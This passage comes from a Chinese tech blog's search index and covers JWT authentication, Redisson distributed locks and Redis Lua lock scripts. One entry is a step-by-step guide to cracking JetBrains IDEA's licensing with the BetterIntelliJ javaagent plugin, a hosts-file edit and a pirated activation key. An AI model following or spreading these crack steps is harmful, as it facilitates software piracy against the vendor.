传统的身份验证 用户向服务器发送用户名和密码 验证服务器后，相关数据（如用户角色，登录时间等）将保存在当前会话中 服务器向用户返回 session_id，Session 信息都会写入到用户的 Cookie 中 用户的每个后续请求都将通过在 Cookie 中取出 session_id 并传递给服务器 服务器收到 session_id 并对比之前保存的数据，确认用户的身份 这种模式最大的问题是，没有分布式架构，无法支持横向扩展。如果使用一个服务器，该模式完全没有问题。但是，如果它是服务器群集或面向服务的跨域体系结构的话，则需要一个统一的 Session 数据库（Redis）来保存会话数据实现共享，如果保存 Session 的数据库（Redis）挂掉，整个认证体系都会挂掉。 JWT 的身份验证JWT 的原则是在服务器身份验证之后，将生成一个 JSON 对象并将其发送给用户。之后，当用户与服务器通信时，客户在请求中带上 JSON 对象，服务器仅依赖于这个 JSON 对象来标识用户。为了防止用户篡改数据，服务器将在生成对象时添加签名。服务器不保存任何会话数据，即服务器变为无状态，使其更容易扩展。具体的身份验证流程如下： 用户发起登录请求，请求认证服务 认证服务成功认证后，生成 JWT 令牌，并将 JWT 令牌写入到用户的 Cookie 用户访问 Web 资源页面，带着 Cookie 到网关服务 网关服务从 Cookie 获取并校验用户的 JWT 令牌，如果 JWT 令牌有效否则放行请求 用户注销登录，请求认证服务，删除用户 Cookie 中的 JWT 令牌 JWT 与 传统身份验证比较JWT 和传统的 Cookie/Session 会话管理相比较有着多方面的优势，因为 Cookie/Session 需要在 Web 服务器的 Session 里存放用户信息，然后通过客户端 Cookie 中存储的 session_id 来获取特定的用户信息，这个过程需要消耗 Web 服务器的内存和对客户端的要求比较严格（必须支持 Cookie），而 JWT 最大的特性在于就是无状态、去中心化，所以 JWT 更适用分布式的场景，不需要在多台服务器做会话同步这种消耗服务器性能的操作。另外 JWT 和 Redis + Token 这两种会话管理方案需要根据项目情况选择，别用了 JWT 还使用 Redis 存储的，因为这种做法对 JWT 来说就是 “伤害不大，但侮辱性极强” 的做法，相当于无视 JWT 的 “无状态” 特性。 JWT 字符串结构JWT 字符串由 Header（头部）、Payload（负载）、Signature（签名）三部分组成： Header: JSON 对象，用来描述 JWT 的元数据，alg 属性表示签名的算法，typ 标识 token 的类型 Payload: JSON 对象，重要部分，除了默认的字段，还可以扩展自定义字段，比如用户 ID、姓名、角色等等 Signature: 对 Header、Payload 这两部分进行签名，认证服务器使用私钥签名，然后在资源服务器使用公钥验签，防止数据被人动了手脚 JWT 签名有对称和非对称两种方式： 对称方式：认证服务器和资源服务器使用同一个密钥进行加签和验签 ，默认算法 HMAC 非对称方式：认证服务器使用私钥加签，资源服务器使用公钥验签，默认算法 RSA 非对称方式相较于对称方式更为安全，因为私钥只有认证服务器知道 JWT 开源库的使用OAuth 2.0 与 JWT 的关系 OAuth 2.0 是一种认证授权的协议规范 JWT 是基于 Token 的安全认证协议的实现 OAuth 2.0 的认证服务器签发的 Token 可以使用 JWT 来实现，JWT 轻量且安全。 Gateway + OAuth 2.0 + JWT 实现统一的认证授权 Gateway + Security + OAuth 2.0 + JWT 实现统一的认证授权 参考博客 nimbus-jose-jwt JWT 库使用介绍 Spring Cloud Gateway + JWT 实现统一的认证授权 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"oauth"},{title:"JetBrains IDEA 2020.3.2 破解激活教程",url:"/posts/3644bd49.html",text:'最新公告本教程提供的激活码已失效，建议参考这篇博客，使用最新的方式来激活 JetBrains IDEA 2020.3.2 或者更新的版本。 前言本教程适用于 JetBrains IDEA 2020.3.2 以下所有版本（包括 IDEA 2020 全系列），支持将 IDEA 2020.3.2 激活到 2099 年，亲测激活成功！！！ 资源下载 JetBrains IDEA 下载：官网 JetBrains IDEA&nbsp;破解补丁下载：本站 激活步骤第一步更改 hosts 文件，将 hosts 文件中有关 Jetbrains 的配置行全部删除掉，若没有则请忽略此步骤。Windows 系统的 hosts 文件路径为：C:\\Windows\\System32\\drivers\\etc\\hosts，Linux 和 Mac 系统的 hosts 文件路径为：/etc/hosts，一般情况下只需删除以下两行内容即可： 120.0.0.0 www.jetbrains.com0.0.0.0 account.jetbrains.com 第二步下载安装 JetBrains IDEA，然后启动 IDEA 并选择试⽤（Evaluate for free）模式进⼊软件（如下图），首次启动后的配置项根据自己的需要勾选即可，此步骤不会影响后面破解的过程。假设软件之前已经在试用或者试用过而且过期了，那么可以先删除 IDEA 的所有配置文件，然后再重新启动软件，IDEA 配置文件所在的目录如下： 1234567# Windows系统C:\\Documents and Settings\\Administrator\\.idea-2020.3\\configC:\\Documents and Settings\\Administrator\\.idea-2020.3\\system# Linux/Mac系统~/.config/JetBrains/IntelliJIdea2020.3~/.local/share/JetBrains/IntelliJIdea2020.3 第三步下载并解压破解补丁的压缩文件，得到 BetterIntelliJ.zip 文件和激活 KEY，切记以后不能随意删除或者移动 BetterIntelliJ.zip 文件的位置，否则 IDEA 激活之后还会失效。 第四步JetBrains IDEA 启动后（试用模式），手动选择创建或者打开一个项目，进入到 IDEA 的主界面。在菜单栏导航到：File -&gt; Settings -&gt; Plugins -&gt; Install Plugin From Disk，然后找到 BetterIntelliJ.zip 文件开始安装破解插件。当破解插件安装完成后，手动重启 IDEA 让插件生效，建议检查 IDEA 的进程是否真正关闭了。特别注意，以后不能随意在 IDEA 的插件市场更新 BetterIntelliJ 破解插件的版本，否则 IDEA 的破解激活会失效。 第五步检查破解插件是否安装成功，IDEA 的菜单栏导航到：Help -&gt; Edit Custom Vm Options，如果配置文件末尾出现了一行 -javaagent:/xxxx/BetterIntelliJ-1.16.jar，则说明破解插件安装成功。值得一提的是，在 Linux/Mac 64 位系统环境下，破解插件所用的配置文件的路径为 /${HOME}/.config/JetBrains/IntelliJIdea2020.3/idea64.vmoptions，而不是 IDEA 自身安装目录下的 idea64.vmoptions 配置文件。 破解插件在不同系统平台的正确配置如下： 12345# Windows系统-javaagent:C:\\Users\\Public\\.BetterIntelliJ\\BetterIntelliJ-版本号.jar# Linux/Mac系统-javaagent:${HOME}/.BetterIntelliJ/BetterIntelliJ-版本号.jar 第六步IDEA 的菜单导航到：Help -&gt; Register -&gt; Add New License，将破解补丁压缩文件里的激活 KEY 复制到 IDEA 激活码的输入框里，然后点击 Activate 激活按钮即可，如下图所示： 第七步查看 IDEA 是否破解成功，IDEA 的菜单栏导航到：Help -&gt; About，若出现下图的信息则说明破解成功。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"开发工具"},{title:"Redisson 分布式锁使用教程",url:"/posts/f838cf2a.html",text:'前言 Redisson 官网 Redisson 官方文档 Redisson GitHub 仓库 Redisson 简介Redisson 是架设在 Redis 基础上的一个 Java 驻内存数据网格（In-Memory Data Grid）。充分地利用了 Redis 键值数据库提供的一系列优势，基于 Java 实用工具包中的常用接口，为使用者提供了一系列具有分布式特性的常用工具类。使得原本作为协调单机多线程并发程序的工具包获得了协调分布式多机多线程并发系统的能力，大大降低了设计和研发大规模分布式系统的难度。同时结合各富特色的分布式服务，更进一步简化了分布式环境中程序相互之间的协作。Redisson 的宗旨是促进使用者对 Redis 的关注分离（Separation of Concern），从而让使用者能够将精力更集中地放在处理业务逻辑上。值得一提的是，Redisson 底层采用的是 Netty 框架。支持 Redis 2.8 以上版本，支持 Java 1.6+ 以上版本。 Redisson 对象Redis 命令和 Redisson 对象匹配列表请阅读 这里。 Redisson 基础使用Spring 整合 Redisson 引入 Maven 依赖 12345&lt;dependency&gt; &lt;groupId&gt;org.redisson&lt;/groupId&gt; &lt;artifactId&gt;redisson&lt;/artifactId&gt; &lt;version&gt;3.19.0&lt;/version&gt;&lt;/dependency&gt; 配置 Redisson 客户端的连接信息，包括 Reids 服务器的地址、密码等内容。 123456789101112131415@Configurationpublic class RedisssonConfig { @Bean(destroyMethod = "shutdown") public RedissonClient redissonClient() throws IOException { Config config = new Config(); config.useSingleServer() // 地址 .setAddress("redis://127.0.0.1:6379") // 密码 .setPassword("123456"); return Redisson.create(config); } } 提示 上述的配置方式同样适用于 SpringBoot 项目。 配置完 Redisson 客户端后，在 Java 业务代码里就可以直接注入 RedissonClient 实例对象来使用 Redisson 提供的各种分布式锁了。 可重入锁 (Reentrant Lock)基于 Redis 的 Redisson 分布式可重入锁 RLock 实现了 java.util.concurrent.locks.Lock 接口，同时还提供了异步（Async）、反射式（Reactive）和 RxJava2 标准的接口。众所周知，如果负责储存这个分布式锁的 Redisson 节点宕机以后，而且这个锁正好处于锁住的状态时，这个锁会出现锁死的状态。为了避免这种情况的发生，Redisson 内部提供了一个监控锁的看门狗，它的作用是在 Redisson 实例被关闭前，不断的延长锁的有效期。默认情况下，看门狗的检查锁的超时时间是 30 秒钟，也可以通过修改 Config.lockWatchdogTimeout 来另行指定。另外 Redisson 还为加锁的方法提供了 leaseTime 参数来指定加锁的时间，超过这个时间后锁便会自动解开。 直接获取锁，阻塞等待直至获取到锁 12345678910111213141516171819202122232425@SpringBootTestpublic class RedissonTest { @Autowired private RedissonClient redissonClient; @Test public void rLock() throws InterruptedException { // 获取可重入锁 RLock lock = redissonClient.getLock("rLock"); // 阻塞等待，直至获取到锁 lock.lock(); try { System.out.println("==&gt; success to get locker"); Thread.sleep(5000); } catch (Exception e) { e.printStackTrace(); } finally { // 解锁 lock.unlock(); } }} 提示 RLock.lock() 方法加锁后，默认加的锁的有效期是 30 秒。 RLock.lock() 方法加锁后，如果业务耗时超长，Redisson 在业务执行期间会周期性地自动给锁续上新的 30 秒有效期（看门狗机制），不用担心业务执行时间过长，锁自动过期被删掉的问题。 RLock.lock() 方法加锁后，只要加锁的业务运行完成，Redisson 就不会再给当前锁续期，即使不手动解锁，锁默认会在 30 秒内自动删除。 直接获取锁，阻塞等待直至获取到锁，且上锁以后 10 秒自动解锁 12345678910111213141516171819202122232425@SpringBootTestpublic class RedissonTest { @Autowired private RedissonClient redissonClient; @Test public void rLock() throws InterruptedException { // 获取可重入锁 RLock lock = redissonClient.getLock("rLock"); // 阻塞等待，直至获取到锁，且上锁以后10秒自动解锁 lock.lock(10, TimeUnit.SECONDS); try { System.out.println("==&gt; success to get locker"); Thread.sleep(5000); } catch (Exception e) { e.printStackTrace(); } finally { // 解锁 lock.unlock(); } }} 特别注意 调用 RLock.lock(10, TimeUnit.SECONDS) 方法加锁时，设置自动解锁的时间必须大于业务的执行时间。 调用 RLock.lock(10, TimeUnit.SECONDS) 方法加锁时，在锁时间到了以后，即使业务未执行完成，Redisson 也不会给锁续期，也就是看门狗机制此时不会生效。 尝试获取锁，阻塞等待，但不能超过指定的最大等待时间，且上锁以后 10 秒自动解锁 12345678910111213141516171819202122232425@SpringBootTestpublic class RedissonTest { @Autowired private RedissonClient redissonClient; @Test public void rLock() throws InterruptedException { // 获取可重入锁 RLock lock = redissonClient.getLock("rLock"); // 尝试加锁，最多等待100秒，上锁以后10秒自动解锁 boolean res = lock.tryLock(100, 10, TimeUnit.SECONDS); if (res) { try { System.out.println("==&gt; success to get locker"); Thread.sleep(5000); } finally { // 解锁 lock.unlock(); } } }} 特别注意 调用 RLock.tryLock(100, 10, TimeUnit.SECONDS) 方法加锁时，设置自动解锁的时间必须大于业务的执行时间。 调用 RLock.tryLock(100, 10, TimeUnit.SECONDS) 方法加锁时，在锁时间到了以后，即使业务未执行完成，Redisson 也不会给锁续期，也就是看门狗机制此时不会生效。 读写锁 (ReadWriteLock)基于 Redis 的 Redisson 分布式可重入读写锁 RReadWriteLock 实现了 java.util.concurrent.locks.ReadWriteLock 接口，其中读锁和写锁都继承了 RLock 接口。分布式可重入读写锁允许同时有多个读锁和一个写锁处于加锁状态。 读写锁的特性 读 + 读：相当于无锁，支持并发读 写 + 读：读操作需要等待写操作完成 读 + 写：写操作需要等待读操作完成 写 + 写：互斥，需要等待对方的锁释放 简而言之，只要有写锁存在，则其他操作都必须阻塞等待 单元测试代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172@SpringBootTestpublic class RedissonTest { @Autowired private RedissonClient redissonClient; /** * 缓存（非线程安全） */ public static final Map&lt;String, String&gt; CACHES = new HashMap&lt;&gt;(); /** * 写入数据 */ private String writeValue() { // 获取写锁 RReadWriteLock rwLock = redissonClient.getReadWriteLock("rw-lock"); RLock writeLock = rwLock.writeLock(); String uuid = UUID.randomUUID().toString(); try { // 加写锁 writeLock.lock(); Thread.sleep(8000); CACHES.put("uuid", uuid); System.out.println("==&gt; write uuid : " + uuid); } catch (Exception e) { e.printStackTrace(); } finally { // 解写锁 writeLock.unlock(); } return uuid; } /** * 读取数据 */ private String readValue() { // 获取读锁 RReadWriteLock rwLock = redissonClient.getReadWriteLock("rw-lock"); RLock readLock = rwLock.readLock(); String uuid = null; try { // 加读锁 readLock.lock(); uuid = CACHES.get("uuid"); System.out.println("==&gt; read uuid : " + uuid); } catch (Exception e) { e.printStackTrace(); } finally { // 解读锁 readLock.unlock(); } return uuid; } @Test public void readWriteLock() throws Exception { // 写操作 new Thread(this::writeValue).start(); Thread.sleep(500); // 读操作（会阻塞等待写操作完成才执行） new Thread(this::readValue).start(); System.in.read(); } } 单元测试结果 12==&gt; write uuid : 7d611f3a-2437-413d-b1aa-4041decc344e==&gt; read uuid : 7d611f3a-2437-413d-b1aa-4041decc344e 提示 读锁是一个共享锁，支持并发地执行读操作。 写锁是一个排他锁（互斥锁），可防止并发地执行写操作。 使用读写锁，可以保证读到的数据永远是最新的；只要写锁没有释放掉，那么拥有读锁的操作就会一直阻塞等待，直至写锁被释放。 闭锁 (CountDownLatch)基于 Redis 的 Redisson 分布式闭锁 RCountDownLatch 采用了与 java.util.concurrent.CountDownLatch 相似的接口和用法。闭锁适用于等待一个多线程的操作，也就是等待 N 个线程把所有业务执行完毕后，再处理一个业务。关于闭锁的使用场景，可以想象一下公司的门卫如何等所有员工下班后再关门。公司一共有五名员工，门卫需要等这五名员工下班后，才能关闭大门。 闭锁的使用场景 闭锁可以延迟线程的进度直到其到达终止状态，闭锁可以用来确保某些活动直到其他活动都完成才继续执行： a) 确保某个计算在其需要的所有资源都被初始化之后才继续执行 b) 确保某个服务在其他依赖的所有其他服务都已经启动之后才启动 c) 等待直到某个操作所有参与者都准备就绪再继续执行 单元测试代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051@SpringBootTestpublic class RedissonTest { @Autowired private RedissonClient redissonClient; /** * 门卫关门 */ public void lockDoor() { RCountDownLatch countDownLatch = redissonClient.getCountDownLatch("countDownLatch"); // 设置总共有5个员工 countDownLatch.trySetCount(5); try { // 门卫等待所有员工下班 countDownLatch.await(); System.out.println("==&gt; 门卫关门成功"); } catch (InterruptedException e) { e.printStackTrace(); } } /** * 员工下班 */ public void offWork(long num) { RCountDownLatch countDownLatch = redissonClient.getCountDownLatch("countDownLatch"); // 未下班的员工计数减一 countDownLatch.countDown(); System.out.println("==&gt; " + num + " 号员工下班"); } @Test public void countDownLatch() throws Exception { // 模拟门卫关门 new Thread(this::lockDoor).start(); Thread.sleep(1000); // 模拟5个员工下班 for (int i = 0; i &lt; 5; i++) { new Thread(() -&gt; { offWork(Thread.currentThread().getId()); }).start(); } System.in.read(); } } 单元测试结果 123456==&gt; 113 号员工下班==&gt; 112 号员工下班==&gt; 114 号员工下班==&gt; 115 号员工下班==&gt; 116 号员工下班==&gt; 门卫关门成功 信号量 (Semaphore)基于 Redis 的 Redisson 的分布式信号量 RSemaphore 采用了与 java.util.concurrent.Semaphore 相似的接口和用法，同时还提供了异步（Async）、反射式（Reactive）和 RxJava2 标准的接口。关于信号量的使用场景，可以想象一下平时停车场如何停车。一共有十辆车准备停车，停车位有五个，当五个停车位满了后，其他车只能等有车位空出来才能停车。可以把停车位比作信号，现在有五个信号，停一次车，用掉一个信号，车离开就是释放一个信号。值得一提的是，RSemaphore 可用于实现分布式限流。RSemaphore 的原理图如下。 单元测试代码 123456789101112131415161718192021222324252627282930313233343536@SpringBootTestpublic class RedissonTest { @Autowired private RedissonClient redissonClient; @Test public void semaphore() throws IOException { // 获取信号量 RSemaphore semaphore = redissonClient.getSemaphore("semaphore"); // 设置许可数量，模拟五个停车位 semaphore.trySetPermits(5); // 创建10个线程，模拟10辆车过来停车 ExecutorService executorService = Executors.newFixedThreadPool(10); for (int i = 0; i &lt; 10; i++) { executorService.submit(() -&gt; { try { // 占用信号（停车位） semaphore.acquire(); Thread.sleep(1000); System.out.println("==&gt; 车辆 " + Thread.currentThread().getId() + " 进入停车场"); } catch (Exception e) { e.printStackTrace(); } finally { // 释放信号（停车位） semaphore.release(); System.out.println("==&gt; 车辆 " + Thread.currentThread().getId() + " 离开停车场"); } }); } System.in.read(); } } 单元测试结果 1234567891011121314151617181920==&gt; 车辆 113 进入停车场==&gt; 车辆 110 进入停车场==&gt; 车辆 109 进入停车场==&gt; 车辆 111 进入停车场==&gt; 车辆 108 进入停车场==&gt; 车辆 108 离开停车场==&gt; 车辆 109 离开停车场==&gt; 车辆 110 离开停车场==&gt; 车辆 111 离开停车场==&gt; 车辆 113 离开停车场==&gt; 车辆 112 进入停车场==&gt; 车辆 117 进入停车场==&gt; 车辆 114 进入停车场==&gt; 车辆 116 进入停车场==&gt; 车辆 116 离开停车场==&gt; 车辆 114 离开停车场==&gt; 车辆 112 离开停车场==&gt; 车辆 117 离开停车场==&gt; 车辆 115 进入停车场==&gt; 车辆 115 离开停车场 可过期性信号量 (PermitExpirableSemaphore)基于 Redis 的 Redisson 可过期性信号量 RPermitExpirableSemaphore 是在 RSemaphore 对象的基础上，为每个信号增加了一个过期时间。每个信号可以通过独立的 ID 来辨识，释放时只能通过提交这个 ID 才能释放。它提供了异步（Async）、反射式（Reactive）和 RxJava2 标准的接口。 单元测试代码 12345678910111213141516171819202122232425262728293031323334353637@SpringBootTestpublic class RedissonTest { @Autowired private RedissonClient redissonClient; @Test public void expirableSemaphore() throws IOException { // 获取可过期性信号量 RPermitExpirableSemaphore semaphore = redissonClient.getPermitExpirableSemaphore("expirable-semaphore"); // 设置许可数量，模拟五个停车位 semaphore.trySetPermits(5); // 创建10个线程，模拟10辆车过来停车 for (int i = 0; i &lt; 10; i++) { new Thread(() -&gt; { // 信号的 ID 标识 String permitId = null; try { // 占用信号量（停车位），有效期只有5秒 permitId = semaphore.acquire(5, TimeUnit.SECONDS); Thread.sleep(1000); System.out.println("==&gt; 车辆 " + Thread.currentThread().getId() + " 进入停车场"); } catch (Exception e) { e.printStackTrace(); } finally { // 释放信号量（停车位） semaphore.release(permitId); System.out.println("==&gt; 车辆 " + Thread.currentThread().getId() + " 离开停车场"); } }).start(); } System.in.read(); } } 单元测试结果 1234567891011121314151617181920==&gt; 车辆 115 进入停车场==&gt; 车辆 109 进入停车场==&gt; 车辆 112 进入停车场==&gt; 车辆 111 进入停车场==&gt; 车辆 113 进入停车场==&gt; 车辆 113 离开停车场==&gt; 车辆 115 离开停车场==&gt; 车辆 111 离开停车场==&gt; 车辆 109 离开停车场==&gt; 车辆 112 离开停车场==&gt; 车辆 110 进入停车场==&gt; 车辆 114 进入停车场==&gt; 车辆 108 进入停车场==&gt; 车辆 106 进入停车场==&gt; 车辆 114 离开停车场==&gt; 车辆 108 离开停车场==&gt; 车辆 106 离开停车场==&gt; 车辆 110 离开停车场==&gt; 车辆 107 进入停车场==&gt; 车辆 107 离开停车场 SpringBoot 整合 Redisson引入 Maven 依赖12345&lt;dependency&gt; &lt;groupId&gt;org.redisson&lt;/groupId&gt; &lt;artifactId&gt;redisson-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;3.19.0&lt;/version&gt;&lt;/dependency&gt; 添加 YML 配置信息 配置 Redis 的连接信息，包括主机地址、端口、密码等信息。 1234567spring: redis: host: 127.0.0.1 port: 6379 password: 123456 database: 0 timeout: 5000 创建 Redission 配置类 创建 Redission 配置类，用于定义 Redission 的客户端。 12345678910111213141516171819202122232425import org.redisson.Redisson;import org.redisson.api.RedissonClient;import org.redisson.config.Config;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.boot.autoconfigure.data.redis.RedisProperties;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;@Configurationpublic class RedisssonConfig { @Autowired private RedisProperties redisProperties; @Bean(destroyMethod = "shutdown") public RedissonClient redissonClient() { String password = redisProperties.getPassword(); String url = String.format("redis://%s:%s", redisProperties.getHost() + "", redisProperties.getPort() + ""); Config config = new Config(); config.useSingleServer().setAddress(url).setPassword(password); return Redisson.create(config); } } 单元测试代码12345678910111213141516171819202122232425@SpringBootTestpublic class RedissonTest { @Autowired private RedissonClient redissonClient; @Test public void rLock() throws InterruptedException { // 获取可重入锁 RLock lock = redissonClient.getLock("rLock"); // 阻塞等待，直至获取到锁 lock.lock(); try { System.out.println("==&gt; success to get locker"); Thread.sleep(5000); } catch (Exception e) { e.printStackTrace(); } finally { // 解锁 lock.unlock(); } }} 参考博客 分布式锁中的王者方案 - Redisson Redis 分布式锁：关于使用 Redlock 算法的官方说明 (中文版) Redis 分布式锁：关于使用 Redlock 算法的官方说明 (英文版) var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java 缓存"},{title:"Redis 分布式锁中 Lua 脚本的使用",url:"/posts/51ce4ef9.html",text:'Lua 简介从 Redis 2.6.0 版本开始，通过内置的 Lua 解释器，可以使用 EVAL 命令对 Lua 脚本进行求值。Redis 使用单个 Lua 解释器去运行所有脚本，并且 Redis 也保证脚本会以原子性 (atomic) 的方式执行。当某个脚本正在运行的时候，不会有其他脚本或 Redis 命令被执行。这和使用 MULTI / EXEC 包围的事务很类似。在其他别的客户端看来，脚本的效果 (effect) 要么是不可见的 (not visible)，要么就是已完成的 (already completed)。在 Lua 脚本中，可以使用 redis.call () 函数来执行 Redis 命令。 Lua 在 Reids 中的使用方式​Redis 中内嵌了 Lua 脚本的解释器，并提供了执行 Lua 脚本的入口 eval 命令，格式为 eval script numkeys key [key ...] arg [arg...]。其中 eval 为命令，script 为执行的命令脚本，numkeys 为脚本中共涉及到的 key 的数量，后续接收若干个 key 的输入和若干个 arg 的输入。​在 Lua 脚本中使用 KEYS[index]， 和 ARGV[index] 来获取实际输入的参数，这有点类似于 SQL 的占位符。另外一层原因由于 Redis 集群的固有模式导致 EVAL 命令在集群中涉及多个 KEY 的操作时，要求所有的 KEY 都在同一个 Hash Solt 上。在集群环境中调用 EVAL 命令，Redis 会对脚本先做一个的校验。KEYS[1] KEYS[2] 是要操作的键，可以指定多个，在 Lua 脚本中可以通过 KEYS[1]、KEYS[2] 获取 Key 的值。特别注意，这些键要在 Redis 中存在，不然就获取不到对应的值。ARGV[1] ARGV[2] 参数在 Lua 脚本中可以通过 ARGV[1]、ARGV[2] 获取值。 Lua 脚本示例 下述的 Lua 脚本可以保证 Redis 删除 Key 这一操作的原子性。该脚本会先判断 Key 是否存在和 Key 的值是否匹配，若满足条件，则会删除对应的 Key。 123456if redis.call("get", KEYS[1]) == ARGV[1]then return redis.call("del", KEYS[1])else return 0end Redis 执行 Lua 脚本的保证Redis 可以保证对一个 Lua 脚本执行的完整性，也就是说一个 Lua 脚本的执行结果只会有成功和失败，且保证在 Redis Server 端同时只会有一个 Lua 脚本在运行，这样就意味着 Lua 脚本中的操作是一个完整的原子操作，不会伴随中间状态和资源竞争，同时也意味着在 Lua 脚本中不适合进行一些耗时较长的操作。由于有以上的保证，使用 Redis 来进行一些复杂的原子操作就再合适不过了，setnx 与 setex 命令的局限性也被 Redis Lua 进行了弥补。Redis 对嵌入的 Lua 做了若干的限制，可以保证脚本不对 Redis 造成破坏。不提供访问系统状态的库，禁止使用 loadfile 函数，禁止带有随机性质的命令或者带有副作用的命令，对随机读命令的结果进行排序，替换 math 原有的 random 方法，不允许定义函数，不允许声明全局变量等。 Lua 脚本调用 Redis 命令在 Lua 脚本中，可以使用 redis.call() 函数调用 Redis 的命令，示例代码如下。redis.call() 函数的返回值就是 Redis 命令的执行结果。Redis 命令的返回值有 5 种类型，redis.call() 函数会将这 5 种类型的返回值转换成对应的 Lua 数据类型。 12345-- Set Keyredis.call(\'set\', \'foo\', \'bar\')-- Get Keylocal value = redis.call(\'get\', \'foo\') Redis 分布式锁实现 分布锁一般需要满足两个条件，一个是加拥有过期时间的锁，一个是高性能解锁 解锁：需要采用 Lua 脚本，必须保证解锁操作的原子性 加锁：可以采用两种方式，但都必须保证加锁操作的原子性 第一种方式：在 Lua 脚本中，分别使用 Redis 命令 setnx 与 setex 设置 Key 和过期时间 第二种方式：直接使用 Redis 命令 set resource-key resource-value nx ex max-lock-time 原子性地设置 Key 和过期时间 思考 为什么不能直接使用 Redis 命令 setnx 与 setex 命令实现加锁操作，而是必须借助 Lua 脚本呢？ 当按照上面的流程图直接使用 Redis 命令 setnx 与 setex 实现加锁操作时，如果在 setnx 和 setex 这两个命令执行中间，万一发生网络抖动或者 Reids 服务器宕机了，那么 Key 将没有设置过期时间，也就是 Key 会永远存在；当后续解锁操作执行失败时，会导致其他请求永远获取不到锁。 由于 setnx 与 setex 命令是分步执行的，那么可以想办法将两步合成一步，将加锁操作放在同一个原子中执行即可： 第一种方案：使用 Lua 脚本，它可以保证 setnx 与 setex 命令执行的原子性 第二种方案：Redis 从 2.6 版本之后支持 setnx、setex 连用，也就是可以直接使用 set resource-key resource-value nx ex max-lock-time 命令实现原子性地加锁 基于 Lua 脚本，使用 setnx 与 setex 命令进行加锁的代码 123456789101112local lockKey = KEYS[1]local lockTime = KEYS[2]local lockValue = KEYS[3]local result_1 = redis.call(\'SETNX\', lockKey, lockValue)if result_1 == 1then local result_2= redis.call(\'SETEX\', lockKey, lockTime, lockValue) return result_2else return \'faild\'end 基于 Lua 脚本解锁的代码 123456if redis.call("get", KEYS[1]) == ARGV[1]then return redis.call("del", KEYS[1])else return 0end 提示 在 Spring 项目中，可以直接使用 StringRedisTemplate 实例对象调用 Lua 脚本，只需传入 Lua 脚本的 key 和 arg 参数即可，详细教程请点击 这里。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java 缓存"},{title:"Java 缓存与分布式锁",url:"/posts/150bedf.html",text:'缓存缓存使用为了系统性能的提升，一般都会将部分数据放入缓存中，加快业务服务的处理速度，而数据库则承担数据落盘的工作。 哪些数据适合放入缓存？ 即时性、数据一致性要求不高的数据 访问量大且更新频率不高的数据（读多写少） 比如在电商类应用中，商品分类，商品列表等数据适合缓存，并加一个失效时间 (根据数据更新频率来决定)，后台如果发布一个商品，买家需要 5 分钟后才能看到新的商品，这一般还是可以接受的。 缓存读模式的使用流程图如下 特别注意 在开发中，凡是放入缓存中的数据都应该指定过期时间，使其可以在系统即使没有主动更新数据的情况下，也能自动触发数据加载进缓存的流程。避免出现业务崩溃导致的数据永久不一致问题。 SpringBoot 整合 Redis Maven 引入 SpringBoot 的 Redis Starter 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt;&lt;/dependency&gt; SpringBoot 2.0 以后默认使用的 Redis 客户端是 Lettuce，若希望使用 Jedis 作为客户端（不推荐），可以使用以下 Maven 配置信息 123456789101112131415&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;groupId&gt;io.lettuce&lt;/groupId&gt; &lt;artifactId&gt;lettuce-core&lt;/artifactId&gt; &lt;/exclusion&gt; 